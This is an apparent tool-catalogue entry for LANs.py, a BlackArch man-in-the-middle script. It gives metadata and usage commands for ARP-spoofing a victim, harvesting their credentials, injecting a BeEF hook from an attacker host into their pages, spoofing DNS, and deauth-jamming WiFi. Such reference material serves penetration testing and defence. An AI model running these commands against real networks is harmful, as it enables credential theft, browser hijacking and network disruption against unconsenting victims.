---
name: "lans"
categories:
  - blackarch-spoof
version: "148.9f8ef2d"
homepage: "https://github.com/DanMcInerney/LANs.py"
packaged-by: [blackarch]
blackarch-builddate: "2024-12-25"
build-system: scripts
license: GPL
meta-checked: "2026-11-09"
github-repo: "DanMcInerney/LANs.py"
github-stars: 2636
github-pushed: "2021-07-31"
github-archived: false
github-issues: 17
github-match: "exact"
gh-checked: "2026-11-07"
worth: 3.3
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# lans

> Dan McInerney's LANs.py: one script that finds the most active LAN users, ARP-spoofs only the chosen victim, harvests their cleartext credentials, and can inject HTML/JS into their pages, spoof DNS, or double as a WiFi deauth jammer.

*No corpus evidence — derived from upstream documentation.*

## What it's for

A multi-tool for LAN man-in-the-middle work with an unusual focus on precision (it poisons only the target, the router and if needed the DNS server — nobody else) and on readable output: URLs, searches, emails, and FTP/IMAP/POP3/IRC/HTTP credentials are printed live as the victim produces them. On top of the sniffer it layers content manipulation — inject a BeEF hook or arbitrary HTML into pages the victim visits, and spoof either one domain or every DNS response (a captive-portal effect). It also parses existing pcap files offline (no root needed for that), and when run with no options it turns into a continuous WiFi deauth jammer (the same author's wifijammer functionality). Legacy caveat from the README: unmaintained, and the author recommends bettercap for ARP/MITM needs today. On BlackArch the script installs as `/usr/bin/lans`; upstream it runs as `python LANs.py`. Requires scapy and nfqueue bindings; cleanup on Ctrl-C restores the poisoned ARP tables, flushes iptables and disables IP forwarding.

## Typical use cases

### Pick the busiest victim and harvest their traffic

One sentence of intent: identify who is most worth attacking, then capture what they send.

```
sudo lans -u -p
```

Outcome: ARP-scans the network, compares it against a live capture and lists clients with traffic volume (NetBIOS names attached); select a target interactively and it ARP-spoofs that host only. `-p` prints credentials and messages from FTP/IMAP/POP3/IRC/HTTP plus searches and emails; `-u` logs visited URLs (truncated at 150 characters, static assets filtered). Add `-ip 198.51.100.10` to skip the selection phase and fix the target, `-d` to open driftnet for images, `-n`/`-na` for quick or aggressive nmap scans of the victim.

### Inject a BeEF hook into the victim's browsing

One sentence of intent: hook the victim's browser from the MITM position.

```
sudo lans -b http://198.51.100.5:3000/hook.js -ip 198.51.100.10
```

Outcome: wraps the URL in `<script>` tags and inserts it after the page's `<head>` of every page the victim loads, popping the browser into the BeEF panel at `198.51.100.5`. `-c '<title>Owned.</title>'` injects arbitrary HTML the same way; failures fall back to forwarding so the victim's browsing does not visibly break.

### Spoof DNS for the victim

One sentence of intent: send the victim's browsing where you choose.

```
sudo lans -dns example.com -r 198.51.100.10 -ip 198.51.100.10
```

Outcome: DNS queries for `example.com` and its subdomains get answered with `198.51.100.10`; without `-r` the victim is sent to the attacker's own IP. Swap `-dns` for `-a` to answer every DNS response, redirecting all browsing regardless of hostname.

### Replay a capture offline

One sentence of intent: mine an existing pcap for the same intelligence without touching the network.

```
lans -pcap capture.pcap -ip 198.51.100.10
```

Outcome: parses the libpcap file filtering for the target IP `198.51.100.10` and prints the same URL/credential output as a live run; no root required. Useful for post-engagement analysis of a capture taken elsewhere.

### Jam nearby WiFi networks

One sentence of intent: deauth wireless clients (the tool's no-options mode).

```
sudo lans -s 00:11:BB:33:44:AA
```

Outcome: continuously deauths every client/AP pair it can hear (skipping the MAC given by `-s`), clearing the airspace; `-ch` limits it to one channel, `-m` caps the number of client/AP combos, `-t` spaces the packets, `--directedonly` skips broadcast deauths, and `--accesspoint` targets one AP. WiFi jamming and ARP spying cannot run simultaneously.
